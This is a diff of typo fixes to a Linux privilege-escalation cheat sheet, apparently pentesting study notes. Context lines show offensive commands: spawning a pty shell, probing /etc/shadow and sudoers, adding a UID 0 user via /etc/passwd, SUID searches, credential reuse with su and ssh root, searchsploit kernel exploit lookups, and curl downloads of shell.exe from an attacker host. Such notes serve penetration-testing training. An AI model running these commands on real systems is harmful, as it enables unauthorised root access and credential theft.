@@ -10,7 +10,7 @@ Lastly, we will take a look at kernel exploits for the kernel and Operating syst
 
 ## Upgrading The Terminal
 
-When we gain access to the target system, we can upgrade or terminal if needed. Entering the commands below is an easy way to get our terminal the way we want.
+When we gain access to the target system, we can upgrade our terminal if needed. Entering the commands below is an easy way to get our terminal the way we want.
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -38,7 +38,7 @@ Lets then look to see if the current user can run any commands with elevated pri
 sudo -l
 ```
 
-Can we write to or read /etc/shadow, can we write to /etc/passwd, /etc/sudoers. Whats inside /etc/sudoers.d/.  
+Can we write to or read /etc/shadow, can we write to /etc/passwd, /etc/sudoers. What's inside /etc/sudoers.d/?.  
 
 Here we are able to write to the file /etc/passwd. We can create a sudo user with id 0.
 ```
@@ -156,7 +156,7 @@ ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
 ```
 
-After our search, lets take a look at possible SUDI/SGID escalation possibilities. Check things we are not too sure about. We can check [GTFOBins](https://gtfobins.github.io/) for ways to exploit misconfigurations.
+After our search, let's take a look at possible SUDI/SGID escalation possibilities. Check things we are not too sure about. We can check [GTFOBins](https://gtfobins.github.io/) for ways to exploit misconfigurations.
 ```
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -perm /2000 -type f -exec ls -la {} 2>/dev/null \;
@@ -196,7 +196,7 @@ Can we re-use any passwords or credentials found in our earlier searches.
 ```
 su - bob
 su - root
-msql -u root -p
+mysql -u root -p
 ssh root@192.168.0.4
 ```
 
@@ -227,7 +227,7 @@ program -v
 # Debian
 dpkg -l | grep "name"
 
-# rerpm systemes
+# rpm systemes
 rpm -aq | grep "name"
 ```
 
@@ -256,7 +256,7 @@ file /bin/bash
 lscpu
 ```
 
-After we note the Kerenl information, we can get the OS information.
+After we note the Kernel information, we can get the OS information.
 ```
 cat /etc/*-release
 ```
@@ -266,7 +266,7 @@ What can we use to compile and run code on the target.
 which gcc g++ make gdb python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby
 ```
 
-We can search Google, exploit-db and searchsploit for known exploits in regards to Kerenl and OS versions of the system.
+We can search Google, exploit-db and searchsploit for known exploits in regards to Kernel and OS versions of the system.
 ```
 searchsploit linux 4.4.0 kernel local Privilege Escalation
 searchsploit local kernel 2.6. centos
@@ -321,7 +321,7 @@ curl
 # ftp
 curl -u username:pass123 'ftp://192.168.49.89/test.txt' -o lol.txt
 
-# Settup http sever on Kali
+# Setup http server on Kali
 curl 192.168.0.1/shell.exe -o shell.exe
 
 ## Curl Upload files To Kali
@@ -356,8 +356,8 @@ SMB Server
 # smbserver.py/impacket-smbserver
 
 sudo smbserver.py lab /tmp    
-sudo smbserver.py -smb2support lab /tmp/                            # SMBv2
-sudo smbserver.py lab . -smb2support -username dh -password dh           # Useing username and pasword
+sudo smbserver.py -smb2support lab /tmp/                                # SMBv2
+sudo smbserver.py lab . -smb2support -username bob -password bob123     # Using username and password
 ```
 
 ## End
